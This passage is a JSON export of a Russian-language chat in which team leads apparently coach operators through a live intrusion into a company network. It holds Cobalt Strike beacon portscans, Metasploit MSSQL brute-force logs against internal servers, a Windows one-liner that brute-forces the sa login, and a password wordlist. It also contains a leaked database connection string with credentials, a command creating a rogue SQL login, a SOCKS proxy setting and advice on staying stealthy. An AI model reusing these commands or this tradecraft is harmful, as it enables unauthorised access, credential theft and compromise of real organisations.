[10.7.18.36] with 32 bytes of data:\nReply from 10.7.18.36: bytes=32 time=136ms TTL=121\nReply from 10.7.18.36: bytes=32 time=122ms TTL=121\nReply from 10.7.18.36: bytes=32 time=137ms TTL=121\nReply from 10.7.18.36: bytes=32 time=122ms TTL=121\n\nPing statistics for 10.7.18.36:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 122ms, Maximum = 137ms, Average = 129ms\n``` \n\n```\n(ICMP) Target '10.10.1.41' is alive. [read 8 bytes]\n\n[+] received output:\nScanner module is complete\n\n\n(ICMP) Target '10.1.4.4' is alive. [read 8 bytes]\n10.1.4.4:1433\nScanner module is complete\n\n\n(ICMP) Target '10.5.19.37' is alive. [read 8 bytes]\n10.5.19.37:1433\nScanner module is complete\n\n\n[+] received output:\n(ICMP) Target '10.7.18.36' is alive. [read 8 bytes]\n\n[+] received output:\nScanner module is complete\n```",
+      "ts": "2020-10-03T13:06:52.784Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T13:06:53.171Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YDgDNsmKGtRDs52bu",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`MSSQLSvc.matches.com [204.74.99.100]`",
+      "ts": "2020-10-03T13:00:31.131Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-03T13:00:31.156Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "g7Pei2goQ7HJGMJ9h",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "CREATE LOGIN [Abby] WITH PASSWORD=N'abbyabby', DEFAULT_DATABASE=[master],",
+      "ts": "2020-10-03T12:59:54.494Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:59:54.521Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "r2KoYCJxF4PQYCAQg",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=WHrvRc9wXZ5vuZfsf) да",
+      "ts": "2020-10-03T12:58:37.091Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:58:37.126Z",
+      "attachments": [
+        {
+          "text": "Вот так, да?\n```\nserviceprincipalname          : MSSQLSvc/vCenter.matches.com:1433\n```",
+          "author_name": "user1",
+          "author_icon": "/avatar/user1",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=WHrvRc9wXZ5vuZfsf",
+          "attachments": [],
+          "ts": "2020-10-03T12:58:25.266Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=WHrvRc9wXZ5vuZfsf",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CesPZ2nKus3pCfLxh",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "\"SysConnStr\"=\"company=Carpetright UK;server=CSONAVQA01;dbname=CSONAVQA01;user=repl_ho;passwd=admin;|fin|ndbcs@370\"",
+      "ts": "2020-10-03T12:58:26.517Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:58:26.547Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "m2sk9ra4dxQBAfbc4",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "порты скулей кстати указаны в АД",
+      "ts": "2020-10-03T12:57:28.497Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T12:57:28.522Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3fmsjEqxbZ2yoiJo3",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и еще раз - читайте вывод",
+      "ts": "2020-10-03T12:54:26.661Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:54:26.704Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CKa3jCKyi6N2y9wKY",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "вы вроде хотите быть скрытнее и лишний раз файлы на диск не роняете, но при этом сильно шумите трафиком)",
+      "ts": "2020-10-03T12:54:03.398Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:54:03.449Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pGmyfeAzsvpThSJG8",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "на будущее - когда делаете скан хоть на что, проверяйте порт который нужен",
+      "ts": "2020-10-03T12:53:36.119Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:53:36.158Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iPSXB4NXtT3MGqtcq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "но проверьте",
+      "ts": "2020-10-03T12:53:19.039Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:53:19.070Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9ZEzzeGtA2MyDqrYP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "вряд ли там dhcp конечно",
+      "ts": "2020-10-03T12:53:15.335Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:53:15.381Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AguzdqjJSzupnqnFS",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "отпинговать скули по новой?",
+      "ts": "2020-10-03T12:52:56.372Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:52:56.405Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KYtuA4QXcjiuWCoGQ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nUnable to Connect: )\n```",
+      "ts": "2020-10-03T12:52:06.760Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:52:06.797Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qxpcvtkAYB9F7C777",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "как минимум я видел",
+      "ts": "2020-10-03T12:51:57.014Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:51:57.048Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LegNbKcfZhr5jFwDB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а сами почему не просканировали?",
+      "ts": "2020-10-03T12:51:53.313Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:51:53.350Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NdTDoPtz3je4vZA8G",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n(ICMP) Target '10.1.4.4' is alive. [read 8 bytes]\n10.1.4.4:1433\nScanner module is complete\n``` \n\n```\n(ICMP) Target '10.7.18.36' is alive. [read 8 bytes]\n\n[+] received output:\nScanner module is complete\n``` \n\n```\nbeacon> portscan 10.7.19.25 1433\n[*] Tasked beacon to scan ports 1433 on 10.7.19.25\n[+] host called home, sent: 93245 bytes\n[+] received output:\nScanner module is complete\n```",
+      "ts": "2020-10-03T12:51:37.300Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:51:37.443Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xDgysPKQQKyRJePqe",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и еще, скиньте плиз портскан на скуль порт ко всем 3 серверам",
+      "ts": "2020-10-03T12:49:23.360Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:49:23.403Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GhNyDxy8D9dp7DYhm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а этого не было в rockyou?",
+      "ts": "2020-10-03T12:49:07.870Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:49:07.896Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dJwci9HXaaiYvjPfH",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "пускать самое тупое?",
+      "ts": "2020-10-03T12:48:49.727Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:48:49.767Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mnuiFinLzBd4SkAXq",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-03T12:47:52.917Z",
+      "msg": "",
+      "file": {
+        "_id": "u64tZwqQWiQsMqHoX",
+        "name": "osql.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "osql.exe",
+          "title_link": "/file-upload/u64tZwqQWiQsMqHoX/osql.exe",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T12:47:52.940Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NMnPWq9doKJzA9H6s",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nfor /f %s in (srv.txt) do @ (for /f %p in (pwd.txt) do @ osql -S %s -U sa -P %p -Q \"select @@servername\" >> result.txt && echo %s:%p >> result.txt)\n``` \nвот чет типа того можно\nно в этой команде где-то есть ошибка ;- )",
+      "ts": "2020-10-03T12:47:46.974Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T12:47:47.047Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mXmPJa9roKuWTBvGp",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "самое тупое на скульбрут - вот что выше",
+      "ts": "2020-10-03T12:47:20.695Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T12:47:20.715Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4T5Q8estmBvuN8HC6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n1\n123\n1234\n12345\n123456\n1234567\n12345678\n123456789\n1234567890\nsa\nsasa\nsqlsa\nsqladmin\nsqladmin1\nsa1\ns@dmin\nP455w0rd\np455w0rd\np455word\np455wOrd\nP455word\nP455wOrd\nP4ssw0rd\np4ssw0rd\np4sSw0rd\np4Ssw0rd\nP4ssword\np4ssword\np4sswOrd\nP4sswOrd\nP@55w0rd\np@55w0rd\np@55word\nP@55word\np@55wOrd\nP@55wOrd\npa55w0rd\nPa55w0rd\npa55word\nPa55word\nPassw0rd\npassw0rd\nPasswOrd\nPassword\npassword\nPaSsWoRd\nPASSword\nPASSWORD\npasswOrd\npa$w0rd\npa$word\nP@ssw0rd\np@ssw0rd\np@sSw0rd\np@Ssw0rd\nP@ssword\np@ssword\np@sswOrd\nP@sswOrd\nP@$w0rd\np@$w0rd\np@$word\np@$wOrd\nP@$word\nP@$wOrd\nP455w0rd1\np455w0rd1\np455word1\np455wOrd1\nP455word1\nP455wOrd1\nP4ssw0rd1\np4ssw0rd1\np4sSw0rd1\np4Ssw0rd1\nP4ssword1\np4ssword1\np4sswOrd1\nP4sswOrd1\nP@55w0rd1\np@55w0rd1\np@55word1\nP@55word1\np@55wOrd1\nP@55wOrd1\npa55w0rd1\nPa55w0rd1\npa55word1\nPa55word1\nPassw0rd1\npassw0rd1\nPasswOrd1\nPassword1\npassword1\nPaSsWoRd1\nPASSword1\nPASSWORD1\npasswOrd1\npa$w0rd1\npa$word1\nP@ssw0rd1\np@ssw0rd1\np@sSw0rd1\np@Ssw0rd1\nP@ssword1\np@ssword1\np@sswOrd1\nP@sswOrd1\nP@$w0rd1\np@$w0rd1\np@$word1\np@$wOrd1\nP@$word1\nP@$wOrd1\n```",
+      "ts": "2020-10-03T12:47:06.178Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T12:47:06.330Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "p6otkawyFKExNKNjd",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[*] 10.7.19.25:1433       - 10.7.19.25:1433 - MSSQL - Starting authentication scanner.\n[*] 10.7.18.36:1433       - 10.7.18.36:1433 - MSSQL - Starting authentication scanner.\n[*] 10.1.4.4:1433         - 10.1.4.4:1433 - MSSQL - Starting authentication scanner.\n[-] 10.1.4.4:1433         - Unable to parse encryption req during pre-login, this may not be a MSSQL server\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Incorrect: )\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08; (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Unable to Connect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12; (Unable to Connect: )\n[*] Scanned 3 of 3 hosts (100% complete)\nexploit -j\n[*] Auxiliary module running as background job 1.\nmsf6 auxiliary(scanner/mssql/mssql_login) > \n[*] 10.7.19.25:1433       - 10.7.19.25:1433 - MSSQL - Starting authentication scanner.\n[*] 10.1.4.4:1433         - 10.1.4.4:1433 - MSSQL - Starting authentication scanner.\n[*] 10.7.18.36:1433       - 10.7.18.36:1433 - MSSQL - Starting authentication scanner.\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Incorrect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Incorrect: )\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw08 (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Unable to Connect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:sapw12 (Unable to Connect: )\n[*] Scanned 3 of 3 hosts (100% complete)\nexploit -j\n[*] Auxiliary module running as background job 2.\nmsf6 auxiliary(scanner/mssql/mssql_login) > \n[*] 10.7.19.25:1433       - 10.7.19.25:1433 - MSSQL - Starting authentication scanner.\n[*] 10.1.4.4:1433         - 10.1.4.4:1433 - MSSQL - Starting authentication scanner.\n[*] 10.7.18.36:1433       - 10.7.18.36:1433 - MSSQL - Starting authentication scanner.\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa: (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Incorrect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa: (Unable to Connect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ (Incorrect: )\n[-] 10.1.4.4:1433         - 10.1.4.4:1433 - LOGIN FAILED: WORKSTATION\\sa:pw08 (Incorrect: )\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[*] Scanned 1 of 3 hosts (33% complete)\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Unable to Connect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:Password$ (Unable to Connect: )\n[-] 10.7.19.25:1433       - 10.7.19.25:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Unable to Connect: )\n[-] 10.7.18.36:1433       - 10.7.18.36:1433 - LOGIN FAILED: WORKSTATION\\sa:PasswordA€ pw08 (Unable to Connect: )\n[*] Scanned 2 of 3 hosts (66% complete)\n[*] Scanned 3 of 3 hosts (100% complete)\n\n\n```",
+      "ts": "2020-10-03T12:46:55.228Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:46:55.852Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "o97hBM5xYb68Jrycg",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "на все 3 сервера?",
+      "ts": "2020-10-03T12:46:39.235Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:46:39.273Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tNNjKcqJn6ZTuaHSP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "всё failed",
+      "ts": "2020-10-03T12:45:49.463Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:45:49.491Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zeCgFBtHJnQBZ485v",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Password$\nPasswordA€ pw08\nPasswordA€\npw08",
+      "ts": "2020-10-03T12:43:51.739Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:43:51.766Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "E3ZYtepaFxh47ZCaF",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "еще рекомендую сразу собирать свой словарь для брута sql на будущее, которые не привязаны к домену, году и имени сервера",
+      "ts": "2020-10-03T12:43:37.911Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:43:37.952Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MeyKzcoAd6HQfA25u",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Password$ PasswordA€ pw08",
+      "ts": "2020-10-03T12:42:52.698Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:42:52.726Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PxR6ctdtQrZdGi26E",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "setg Proxies socks4:104.238.205.128:2282",
+      "ts": "2020-10-03T12:42:09.797Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:42:09.838Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SnyD4nsnmpPQ2ehDC",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "щас проверяем",
+      "ts": "2020-10-03T12:37:47.191Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:37:47.228Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mhnxfrbCkixcrZnv6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "отлично)",
+      "ts": "2020-10-03T12:37:37.788Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:37:37.829Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KbWCshnPXTRRYKN6H",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "в шарах ищу",
+      "ts": "2020-10-03T12:37:06.534Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:37:06.598Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qdASgc3Gyr7ZFirwC",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=Af9FsrNjnoLdqp8dG) это откуда?",
+      "ts": "2020-10-03T12:36:51.117Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T12:36:51.155Z",
+      "attachments": [
+        {
+          "text": "sa sapw08;",
+          "author_name": "user4",
+          "author_icon": "/avatar/user4",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=Af9FsrNjnoLdqp8dG",
+          "attachments": [],
+          "ts": "2020-10-03T12:35:04.620Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=Af9FsrNjnoLdqp8dG",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7Bw7PXHebCG6pSs65",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=Ht6pTTvpaofN7oE4B) .",
+      "ts": "2020-10-03T12:35:04.941Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T12:35:04.976Z",
+      "attachments": [
+        {
+          "text": "отпингованные sql-ки\n```\nAWS-VTBCSQL01.matches.com [10.7.19.25] \nEC2AMAZ-U49LCLF.matches.com [10.1.4.4]\nAWS-VTBIMSTRI03.matches.com [10.7.18.36]\n```",
+          "author_name": "user8",
+          "author_icon": "/avatar/user8",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=Ht6pTTvpaofN7oE4B",
+          "attachments": [],
+          "ts": "2020-09-29T09:09:23.771Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=Ht6pTTvpaofN7oE4B",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Af9FsrNjnoLdqp8dG",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "sa sapw08;",
+      "ts": "2020-10-03T12:35:04.620Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T12:35:04.652Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6xvHuvAKP6iJinzpr",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-03T12:31:51.878Z",
+      "msg": "",
+      "file": {
+        "_id": "6TfwSqwgCbzZJcp8T",
+        "name": "Хром.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Хром.txt",
+          "title_link": "/file-upload/6TfwSqwgCbzZJcp8T/%D0%A5%D1%80%D0%BE%D0%BC.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-03T12:31:51.918Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
